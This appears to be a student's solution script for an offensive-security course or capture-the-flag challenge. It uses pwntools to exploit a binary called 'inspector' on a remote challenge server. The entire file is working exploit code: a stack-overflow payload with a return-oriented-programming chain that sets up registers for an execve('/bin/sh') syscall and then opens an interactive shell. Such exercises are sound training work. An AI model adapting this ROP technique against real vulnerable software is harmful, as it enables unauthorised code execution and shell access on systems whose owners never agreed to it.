from pwn import *

#p = process("./inspector")
p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1342)
#gdb.attach(p)
p.recvuntil(":")
p.sendline("jd3846")

print p.recvuntil("!")


syscall = 0x400625
pop_rdi = 0x40062e
pop_rsi = 0x400636
pop_rdx = 0x40063e
pop_rax = 0x400646
binsh = 0x400708

chain = 'A'*32 + 'A'*8

chain += p64(pop_rdi)
chain += p64(binsh)
chain += p64(pop_rax)
chain += p64(0x3b)
chain += p64(pop_rsi)
chain += p64(0x0)
chain += p64(pop_rdx)
chain += p64(0x0)
chain += p64(syscall)

p.sendline(chain)

print "Enjoy your shell!"

p.interactive()

#rax = 0x3b
#rdi = bin sh
#rsi = 0
#rdx = 0